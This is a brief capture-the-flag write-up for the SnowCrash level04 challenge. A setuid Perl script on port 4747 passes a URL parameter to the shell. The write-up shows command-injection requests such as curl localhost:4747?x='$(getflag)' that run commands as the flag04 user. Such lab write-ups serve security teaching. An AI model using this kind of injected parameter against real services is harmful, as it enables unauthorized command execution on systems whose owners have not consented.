-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl

level04.pl has special permissions for flag04

there is a perl script running on port 4747, which prints a parameter 'x'
This can be checked using netstat -tul (tcp, udp, listening)
this allows execution of a command passed as a parameter

level04@SnowCrash:~$ curl localhost:4747?x='$(whoami)'
flag04


using interpolated strings, we get to execute code by the flag user

if getflag gets evaluated from the script, which runs as user flag04,

	curl localhost:4747?x='$(getflag)'

results in the reveal of the flag.

